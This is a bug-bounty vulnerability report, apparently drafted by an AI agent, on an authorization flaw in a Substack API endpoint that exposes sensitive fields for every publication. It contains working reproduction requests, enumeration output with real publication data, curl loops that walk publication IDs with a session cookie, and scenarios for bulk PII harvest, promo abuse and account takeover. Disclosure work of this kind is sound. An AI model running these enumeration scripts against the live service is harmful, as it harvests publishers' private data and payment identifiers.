# Finding 01 — IDOR / enumeration on `/api/v1/subscription/{id}` returns arbitrary publication data

**Target:** `substack.com` (authorized bug bounty, written permission from CEO Chris Best)
**Discovered:** 2026-10-05
**Status:** Confirmed exploitable with account A. **Escalated to P2 after field-set analysis** (143 keys, incl. moderation state, Stripe account ids, hidden subscriber counts, pixel/verification tokens, unlisted contact emails, promo codes).

| Endpoint | Method | Severity | CVSS v3.1 | OWASP | Impact |
|---|---|---|---|---|---|
| `/api/v1/subscription/{publication_id}` | GET | **P2** (High) | 7.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N) | API1:2023 BOLA + API3:2023 BOPLA | Any authenticated reader can enumerate every publication (publication_id 1 → N) and read 143 fields per publication, including: internal moderation flag (`flagged_as_spam`), connected Stripe account (`stripe_user_id`, `stripe_platform_account`, `stripe_country`), exact free subscriber count (`freeSubscriberCount`), ranking/metrics (`rankingDetail*`), publisher sending email (`email_from`), support email (`support_email`), FB/GA/GTM/Parsely/Twitter verification tokens, promo codes (`default_coupon`, `default_group_coupon`, `default_group_coupon_percent_off`), invite-only flag (`invite_only`), payment config (`automatic_tax_enabled`, `payments_state`, `plans`), sponsorship campaigns, fundraising type |

---

## Summary

The route `GET /api/v1/subscription/{id}` is named for subscription resources but internally resolves `{id}` as a **publication_id** and returns the full publication object. There is no scope check — any authenticated session can read any publication's record.

Combined with linear ID enumerability (1 → 1,000,000+ confirmed accessible), this is a platform-wide mass-information-disclosure: an attacker with any Substack reader account can harvest **143 server-side fields** for every publication on the platform in a few hours of HTTP.

### Full key list (top-level + .publication)

Top level: `hasPledge`, `publication`.

Inside `.publication` (143 keys, grouped by sensitivity):

**Highly sensitive / admin-only / financial infra:**
- `flagged_as_spam` — internal moderation state
- `stripe_user_id` — connected Stripe Express/Standard account id
- `stripe_platform_account` — Substack's Stripe Connect platform account id
- `stripe_country`, `stripe_publishable_key`
- `automatic_tax_enabled`
- `fundraising_type`, `plans`
- `founding_plan_name_english`, `founding_subscription_benefits`, `paid_subscription_benefits`, `free_subscription_benefits`
- `has_active_perks`, `sponsorshipCampaigns`
- `pause_return_date`, `trial_end_override`

**Metrics / rank (publisher-private):**
- `freeSubscriberCount`, `freeSubscriberCountOrderOfMagnitude`
- `rankingDetail`, `rankingDetailByLanguage`, `rankingDetailFreeIncluded`, `rankingDetailFreeIncludedOrderOfMagnitude`, `rankingDetailFreeSubscriberCount`, `rankingDetailOrderOfMagnitude`
- `tier`, `multipub_migration`
- `author_bestseller_tier`, `author_badge`

**PII / unlisted contacts:**
- `email_from` — publisher's sending email (often unlisted / role account)
- `support_email` — unlisted support contact

**Promo codes / discounts (business-sensitive):**
- `default_coupon`, `default_group_coupon`, `default_group_coupon_percent_off`
- `default_group_coupon_include_founding`, `minimum_group_size`

**Verification / tracking tokens (should not be enumerable):**
- `fb_pixel_id`, `fb_site_verification_token`
- `ga_pixel_id`, `google_site_verification_token`, `google_tag_manager_token`
- `parsely_pixel_id`, `twitter_pixel_id`
- `chartable_token`, `chartbeat_domain`

**Config / state / posture:**
- `invite_only` — reveals whether a publication is private
- `moderation_enabled`, `has_custom_privacy`, `has_custom_tos`
- `expose_paywall_content_to_search_engines`
- `no_follow`, `no_index`
- `disable_annual_subscriptions`, `disable_monthly_subscriptions`
- `hide_podcast_from_pub_listings`, `hide_podcast_from_pub_listings_prior_to`
- `supports_ip_content_unlock`
- `embed_tracking_disabled`
- `has_free_podcast`, `has_subscriber_only_podcast`, `has_podcast`, `paid_podcast_episode_art_url`
- `require_clickthrough`
- `subscriber_invites`

**Normal public fields** (also included; already exposed on `<slug>.substack.com`):
- `id`, `author_id`, `name`, `subdomain`, `hostname`, `custom_domain`, `apex_domain`, `logo_url`, `logo_url_wide`, `hero_image`, `hero_text`, `copyright`, `created_at`, `language`, `theme`, `homepage_type`, `is_personal_mode`, `explicit`, `community_enabled`, `has_posts`, `has_recommendations`, `has_community_content`, `notes_feed_enabled`, `podcast_*` (public ones), `sections`, `appTheme`, `theme_var_*`, `author_name`, `author_handle`, `author_photo_url`, `author_bio`, `base_url`, `primary_user_id`, `primary_profile_name`, `primary_profile_photo_url`, `contributors`, `bundles`, `showIntroModule`, `hide_intro_subtitle`, `hide_intro_title`, `hide_post_restacks`, `default_show_guest_bios`, `default_comment_sort`, `post_preview_limit`, `post_reaction_faces_enabled`, `cover_photo_url`, `email_banner_url`, `email_from_name`, `can_have_sitemap`, `can_set_google_site_verification`, `custom_domain_optional`, `first_post_date`, `payments_state`, `apple_pay_disabled`, `byline_images_enabled`, `bylines_enabled`, `isPortraitLayout`, `is_on_substack`, `image_thumbnails_always_enabled`, `logoPalette`, `navigationBarItems`, `pageThemes`, `podcastPalette`, `podcastTabInfo`, `portalAppTheme`, `show_pub_podcast_tab`, `show_recs_on_homepage`, `threads_v2_enabled`, `threads_v2_settings`, `type`, `viralGiftsConfig`, `spotify_podcast_settings`, `unified_podcast_settings`, `paywall_chat`, `paywall_free_trial_enabled`, `last_chat_post_at`, `flagged_as_spam` (false by default), `founding_subscription_benefits`.

## Reproduction

Account used: `peter.bjorn75@gmail.com` / user_id `556804859`, reader-only (3 free subscriptions, no publisher role).

```http
GET /api/v1/subscription/1 HTTP/1.1
Host: substack.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0
Cookie: substack.sid=<REDACTED_SESSION>; substack.lli=<REDACTED_LLI_JWT>
Accept: */*
```

Response (first 400 B shown):

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
X-Powered-By: Express
X-Service: web
X-Cluster: substack
X-Deploy: dbadf208af

{"publication":{"apple_pay_disabled":false,"apex_domain":null,
"author_id":41856304,"byline_images_enabled":true,"bylines_enabled":true,
"chartable_token":null,"community_enabled":true,"copyright":"Substack",
"cover_photo_url":null,"created_at":"2017-12-12T04:37:34.302Z",
"custom_domain_optional":false,"custom_domain":null,
"default_comment_sort":"best_first","default_coupon":"its-on",
"default_group_co...
```

Walk a range of IDs to confirm linear enumeration:

```
id=1       status=200 size=24788  author_id=41856304  copyright="Substack"       default_coupon="its-on"
id=2       status=200 size=30664  author_id=86        copyright="Sinocism LLC"
id=3       status=200 size=20253  author_id=2093      copyright="Kelly Dwyer"
id=4       status=200 size=20352  author_id=2076      copyright="Petition LLC"   apex_domain="petition11.com"
id=5       status=200 size=20563  author_id=3548      copyright="Daniel M. Lavery" custom_domain="www.thechatner.com"
id=10      status=200 size=12151  author_id=11230     copyright="Nicole Cliffe"
id=100     status=200 size=9437   author_id=110389    copyright="Nupur Patel"
id=1000    status=200 size=9389   author_id=259970    copyright="Francis Pollara"
id=10000   status=200 size=9769   author_id=1887008
id=100000  status=200 size=9960   author_id=7011325   copyright="Sergio"
```

Unauthenticated access is denied (shows the endpoint IS auth-gated — just not scope-checked):

```http
GET /api/v1/subscription/1 HTTP/1.1
Host: substack.com

HTTP/1.1 401 Unauthorized
Content-Type: application/json; charset=utf-8

{"errors":[{"msg":"Please sign in","msgHTML":"Please <a native href=\"/account/login?redirect=%2Fapi%2Fv1%2Fsubscription%2F1\">sign in</a>."}]}
```

Account B (`peter.bjorndos`) reproduces identically. The guard is "has any valid session", not "owns this subscription".

### Attempts that DO NOT work (confirming the exact shape of the bug)

- `/api/v1/subscription/1565911732` (A's actual subscription_id) → `400 {"error":""}`. Handler clamps or shape-guards large integers; the enumeration range is only `[1, ~1_000_000]` where publication_ids live. **The route is incorrectly named — it treats the path parameter as publication_id.**
- `/api/v1/publication/737237` with same session → **`403 "Not authorized"` (14 B)**. This is the sibling, correctly-guarded endpoint. **Side-by-side proof that `/subscription/{id}` is a scope-bypass of `/publication/{id}`.**
- `/api/v1/user/1` → `403 "Not authorized"` (correctly guarded).
- `/api/v1/publications/1` → 404 (no route).

### Full response shape

```json
{
  "hasPledge": true,
  "publication": { /* 143 fields including the sensitive classes above */ },
  "subscription": { /* only populated when the authenticated user HAS a subscription to {id}; otherwise null */
    "id": 1565911718,
    "user_id": <AUTHENTICATED_USER_ID>,
    "publication_id": 737237,
    "membership_state": "free_signup",
    "visibility": "public",
    "podcast_rss_token": "<UUID>",   /* per-subscriber private podcast feed token */
    "gift_user_id": null,              /* reveals gifter identity if present */
    "paused": null,
    "expiry": null,
    "bundle_id": null,
    "first_payment_at": null,
    "email_disabled": false,
    "created_at": "...",
    "is_founding": false,
    "is_favorite": false
  }
}
```

**Confirmed on `/subscription/5`** (publication A does NOT subscribe to): `.subscription` is `null`, `.publication` is still full 143 fields. The `.publication` leak is **unconditional** on subscription status.

**Confirmed on `/subscription/737237`** (publication A DOES subscribe to): both `.publication` (143 fields) and `.subscription` (A's own record incl. `podcast_rss_token`) are populated. The subscription record is A's own, so the subscription payload itself isn't a cross-user leak here — but it exposes a surface that would become one if a separate IDOR let an attacker swap the authenticated user.

So the vulnerability is specifically that `/subscription/{id}` returns the publication object without the scope check that `/publication/{id}` enforces.

## Impact

### Confirmed
Platform-wide mass info-disclosure. Any authenticated reader can walk `publication_id` 1 → ~1,000,000+ and read 143 fields per publication, including seven classes of sensitive data:

1. **Internal moderation state** — `flagged_as_spam` is exposed for every publication. This reveals Substack's internal spam-moderation decisions to any logged-in user. Reporters/competitors can confirm whether a target publication is internally flagged.
2. **Connected Stripe account identifiers** — `stripe_user_id`, `stripe_platform_account`, `stripe_country` are returned per publication. Not themselves secrets but strong pivots for payment-side abuse and competitive intelligence; also enable confirming whether a specific Stripe account belongs to a specific publisher.
3. **Hidden subscriber counts** — `freeSubscriberCount` and `freeSubscriberCountOrderOfMagnitude` are returned even when the publication's public page suppresses the subscriber-count badge. Publishers who deliberately hide their numbers are deanonymised.
4. **Private publisher contact details (PII)** — `email_from` and `support_email` are often unlisted role/personal addresses. Enumerating these across 1M+ publications is a bulk-PII harvest.
5. **Promo codes** — `default_coupon`, `default_group_coupon`, `default_group_coupon_percent_off`, `default_group_coupon_include_founding` are exposed. These are discount codes the publisher configured. Confirmed example: Substack's own publication (publication_id=1) uses `default_coupon="its-on"`.
6. **Third-party verification tokens** — `fb_site_verification_token`, `google_site_verification_token`, `google_tag_manager_token`, plus pixel ids (`fb_pixel_id`, `ga_pixel_id`, `parsely_pixel_id`, `twitter_pixel_id`, `chartable_token`). Site-verification tokens are intended to be private to the owner; leaking them helps impersonation attempts against FB/Google verification flows.
7. **Business / payment config** — `plans`, `fundraising_type`, `founding_subscription_benefits`, `paid_subscription_benefits`, `free_subscription_benefits`, `sponsorshipCampaigns`, `has_active_perks`, `automatic_tax_enabled`, `pause_return_date`, `trial_end_override`, `multipub_migration`.

### Attack scenarios
1. **Full-platform competitive intelligence dump.** 1M+ publications × 143 fields in one scraped dataset. Includes exact free subscriber counts, ranking percentiles, Stripe payout accounts, and promo codes for the entire creator economy on Substack.
2. **PII harvest.** Dump every `email_from` and `support_email`. Many publishers never list these publicly.
3. **Moderation-state leak.** Monitor `flagged_as_spam` over time for a target publication to detect Substack moderation actions in near-real-time.
4. **Promo abuse.** Harvest every `default_coupon` and `default_group_coupon`; redeem on publications where the publisher didn't realise the code was publicly discoverable.
5. **Verification-token-assisted takeover.** Combine leaked `fb_site_verification_token` / `google_site_verification_token` with social-engineering flows that let an attacker claim a Facebook/Google-side property using the publisher's verification token.
6. **Stripe pivot.** `stripe_user_id` + `stripe_platform_account` identify every publisher's payment account; feed into any Stripe-side attack (webhook replay, Connect OAuth abuse) when combined with other primitives.

### Still open
- Verify invite-only publications also leak (very likely — handler shows no scope check at all). Needs a known-invite-only publication_id.
- Verify the finding reproduces as a Substack creator account (not only as a reader). Expected yes.

## Fix recommendation

1. **Short term:** Add an ownership / membership check to the `/api/v1/subscription/{id}` handler: only return data if the authenticated user's session owns a subscription for publication_id = `{id}`. Otherwise return 404 (not 403, to avoid existence-oracle).
2. **Short term:** Rename the route to `/api/v1/publication/{id}/public_view` or similar. The current name is misleading and almost certainly means the handler was intended to be a user-scoped subscription-detail endpoint, not a global publication lookup.
3. **Medium term:** Audit which fields in the publication object are safe to return anonymously vs. only to the publication's authenticated audience. Move `default_coupon`, `default_group_coupon`, `founding_plan_name`, `payments_state`, `apple_pay_disabled` into an admin-scoped projection.
4. **Medium term:** Add rate limits per authenticated session on `/api/v1/subscription/*` (the current rate limit kicks in only on `/api/v1/admin/*` and `/api/v1/user/{id}` per observed `429` behaviour).

## Appendix — field-set diff vs the public endpoint

Full key list (143 keys) captured above. Comparison against the public endpoint `https://on.substack.com/api/v1/publication/@substack/info` is pending — needs one unauthenticated `curl` from your box plus `jq 'keys'` on the result. Expected delta: the sensitive-class fields listed above (sections 1-7 under Impact.Confirmed) are absent from the public endpoint. That diff is what closes the writeup as submittable.

## Appendix — remaining probes before submission

```bash
# 1. Public comparison baseline (unauth)
curl -sS 'https://on.substack.com/api/v1/publication/@substack/info' | jq 'keys' > /tmp/pub-public-keys.json
diff <(jq -r '.publication | keys[]' /tmp/sub-1.json | sort) <(jq -r 'keys[]' /tmp/pub-public-keys.json | sort)

# 2. Confirm the sensitive-field subset is actually populated across random publications
# (handle false vs null correctly — use jq .field directly, not with // empty which eats false)
A_CK='substack.sid=<YOUR_SESSION_COOKIE>'
for ID in 1 2 100 1000 10000 50000 100000 500000; do
  curl -sS -b "$A_CK" "https://substack.com/api/v1/subscription/$ID" \
    | jq -r '[.publication | {id,subdomain,flagged_as_spam,invite_only,stripe_user_id,freeSubscriberCount,email_from,support_email,default_coupon}] | @json'
done

# 3. Prove invite-only publications leak too — find one by scanning for invite_only=true
A_CK='substack.sid=<YOUR_SESSION_COOKIE>'
for ID in $(seq 1 500); do
  INV=$(curl -sS -b "$A_CK" "https://substack.com/api/v1/subscription/$ID" | jq -r '.publication.invite_only')
  [ "$INV" = "true" ] && echo "INVITE-ONLY: id=$ID"
done | head -5
```

---

## Reserved-for-user actions

- Report submission: pending user decision.
- Second account for cross-verification: already provided; confirmed same behaviour.
- Any outreach to Substack: pending user decision.
